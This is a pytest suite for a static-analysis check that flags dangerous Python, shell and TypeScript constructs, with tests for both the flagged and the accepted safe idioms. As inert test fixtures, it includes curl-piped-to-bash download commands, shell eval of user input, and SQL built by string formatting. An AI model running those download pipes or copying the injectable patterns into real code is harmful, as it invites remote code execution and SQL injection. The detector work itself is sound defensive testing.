"""C-DANGER (CON-013) — dangerous operations and injectable string-building.

The audit that produced this check found the constitution had zero coverage of
`eval`/`exec`/`pickle`/`yaml.load`/`shell=True` while the python-refactor skill
called that dimension CRITICAL. Each "accepts" test below pins a safe idiom that
must never be flagged, because a check that cries wolf on `yaml.safe_load` would
be turned off within a day.

SAFETY: every dangerous construct below is an inert string written to `tmp_path`
and then PARSED by this package's AST checker. Nothing here is imported or
executed, and no fixture reads untrusted input. A scanner flagging this file is
matching the payloads the checker is built to find — which is the point.
"""

import sys
import textwrap
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parents[3]
sys.path.insert(0, str(REPO_ROOT / "configs" / "claude" / "scripts"))

from constitution import registry, source
from constitution.checks import run_checks

REG = registry.load()


def analyze(tmp_path, code, name="mod.py"):
    path = tmp_path / name
    path.write_text(textwrap.dedent(code).lstrip("\n"), encoding="utf-8")
    src = source.SourceFile.load(path, REG)
    return run_checks(src, REG, only=["C-DANGER"])


def messages(findings):
    return " | ".join(f.message for f in findings)


# --------------------------------------------------------------------------
# Arbitrary code execution
# --------------------------------------------------------------------------


def test_flags_eval(tmp_path):
    findings = analyze(tmp_path, "def f(user):\n    return eval(user)\n")
    assert len(findings) == 1
    assert "eval" in messages(findings)


def test_flags_exec(tmp_path):
    findings = analyze(tmp_path, "def f(user):\n    exec(user)\n")
    assert "exec" in messages(findings)


def test_does_not_flag_a_variable_merely_named_eval(tmp_path):
    code = "def f():\n    eval_result = 1\n    self_evaluation = 2\n    return eval_result + self_evaluation\n"
    assert analyze(tmp_path, code) == []


def test_does_not_flag_ast_literal_eval(tmp_path):
    """The safe replacement must not be flagged as the thing it replaces."""
    code = "import ast\n\n\ndef f(text):\n    return ast.literal_eval(text)\n"
    assert analyze(tmp_path, code) == []


# --------------------------------------------------------------------------
# Unsafe deserialization
# --------------------------------------------------------------------------


def test_flags_pickle_loads(tmp_path):
    code = "import pickle\n\n\ndef f(blob):\n    return pickle.loads(blob)\n"
    assert "pickle" in messages(analyze(tmp_path, code))


def test_flags_yaml_load_without_a_loader(tmp_path):
    code = "import yaml\n\n\ndef f(text):\n    return yaml.load(text)\n"
    assert "yaml" in messages(analyze(tmp_path, code))


def test_accepts_yaml_safe_load(tmp_path):
    code = "import yaml\n\n\ndef f(text):\n    return yaml.safe_load(text)\n"
    assert analyze(tmp_path, code) == []


def test_accepts_yaml_load_with_an_explicit_safe_loader(tmp_path):
    code = "import yaml\n\n\ndef f(text):\n    return yaml.load(text, Loader=yaml.SafeLoader)\n"
    assert analyze(tmp_path, code) == []


def test_flags_yaml_load_with_an_explicitly_unsafe_loader(tmp_path):
    """Added after mutation: nothing pinned the WITH-a-Loader branch, so making
    every Loader count as safe passed the whole suite."""
    code = "import yaml\n\n\ndef f(text):\n    return yaml.load(text, Loader=yaml.UnsafeLoader)\n"
    assert "yaml" in messages(analyze(tmp_path, code))


def test_flags_yaml_load_with_the_full_loader(tmp_path):
    code = "import yaml\n\n\ndef f(text):\n    return yaml.load(text, Loader=yaml.FullLoader)\n"
    assert analyze(tmp_path, code) != []


# --------------------------------------------------------------------------
# Shell execution
# --------------------------------------------------------------------------


def test_flags_shell_true(tmp_path):
    code = "import subprocess\n\n\ndef f(cmd):\n    subprocess.run(cmd, shell=True)\n"
    assert "shell" in messages(analyze(tmp_path, code))


def test_accepts_subprocess_with_an_argument_list(tmp_path):
    code = 'import subprocess\n\n\ndef f(path):\n    subprocess.run(["ls", path], check=True)\n'
    assert analyze(tmp_path, code) == []


def test_accepts_shell_false_stated_explicitly(tmp_path):
    code = 'import subprocess\n\n\ndef f(a):\n    subprocess.run(["ls"], shell=False)\n'
    assert analyze(tmp_path, code) == []


def test_flags_os_system_and_popen(tmp_path):
    code = "import os\n\n\ndef f(cmd):\n    os.system(cmd)\n    return os.popen(cmd)\n"
    findings = analyze(tmp_path, code)
    assert len(findings) == 2


# --------------------------------------------------------------------------
# SQL built by string concatenation — the injection this repo's own
# python-refactor skill lists first
# --------------------------------------------------------------------------


def test_flags_execute_with_an_fstring(tmp_path):
    code = 'def f(cur, name):\n    cur.execute(f"SELECT * FROM t WHERE n = {name}")\n'
    assert "built" in messages(analyze(tmp_path, code)).lower()


def test_flags_execute_with_percent_formatting(tmp_path):
    code = 'def f(cur, name):\n    cur.execute("SELECT * FROM t WHERE n = %s" % name)\n'
    assert analyze(tmp_path, code) != []


def test_flags_execute_with_str_format(tmp_path):
    code = 'def f(cur, name):\n    cur.execute("SELECT * FROM t WHERE n = {}".format(name))\n'
    assert analyze(tmp_path, code) != []


def test_flags_execute_with_concatenation(tmp_path):
    code = 'def f(cur, name):\n    cur.execute("SELECT * FROM t WHERE n = " + name)\n'
    assert analyze(tmp_path, code) != []


def test_accepts_execute_with_bound_parameters(tmp_path):
    """The correct idiom: a constant statement plus a parameter sequence."""
    code = (
        'def f(cur, name):\n    cur.execute("SELECT * FROM t WHERE n = ?", (name,))\n'
    )
    assert analyze(tmp_path, code) == []


def test_accepts_a_constant_multiline_statement(tmp_path):
    code = 'def f(cur):\n    cur.execute("""\n    SELECT a, b\n    FROM t\n    """)\n'
    assert analyze(tmp_path, code) == []


# --------------------------------------------------------------------------
# Escape hatch and cross-language coverage
# --------------------------------------------------------------------------


def test_exemption_with_a_reason_suppresses(tmp_path):
    code = (
        "# constitution: exempt C-DANGER — trusted internal expression, never user input\n"
        "def f(expr):\n    return eval(expr)\n"
    )
    assert analyze(tmp_path, code) == []


def test_exemption_without_a_reason_is_still_a_finding(tmp_path):
    code = "# constitution: exempt C-DANGER\ndef f(expr):\n    return eval(expr)\n"
    findings = analyze(tmp_path, code)
    assert len(findings) == 1
    assert "reason" in findings[0].message.lower()


def test_shell_flags_eval_and_piped_download(tmp_path):
    code = '#!/usr/bin/env bash\neval "$user_input"\ncurl -sL https://x.example | sh\n'
    findings = analyze(tmp_path, code, name="run.sh")
    assert len(findings) == 2


def test_shell_accepts_ordinary_commands(tmp_path):
    code = (
        '#!/usr/bin/env bash\nset -euo pipefail\nprintf "%s\\n" "$1"\ngrep -q x "$2"\n'
    )
    assert analyze(tmp_path, code, name="run.sh") == []


def test_shell_case_alternation_is_not_a_pipe(tmp_path):
    """`sh | bash)` is a case pattern. Found by running the check on this repo,
    where it false-positived on four files including lint_on_edit_hook.sh."""
    code = (
        "#!/usr/bin/env bash\n"
        'case "$ext" in\n'
        "    sh | bash) echo shell ;;\n"
        "    python | go | bash | yaml) return 0 ;;\n"
        "esac\n"
    )
    assert analyze(tmp_path, code, name="run.sh") == []


def test_shell_flags_a_real_download_pipe(tmp_path):
    code = (
        "#!/usr/bin/env bash\ncurl -fsSL https://example.com/setup.sh | sudo bash -\n"
    )
    findings = analyze(tmp_path, code, name="run.sh")
    assert len(findings) == 1
    assert "download" in messages(findings)


def test_node_flags_eval_and_new_function(tmp_path):
    code = "export function f(src) {\n  return eval(src);\n}\nconst g = new Function('return 1');\n"
    assert len(analyze(tmp_path, code, name="mod.ts")) == 2


def test_severity_is_error_so_it_blocks(tmp_path):
    findings = analyze(tmp_path, "def f(u):\n    return eval(u)\n")
    assert findings[0].severity == "error"
    assert findings[0].article == "CON-013"
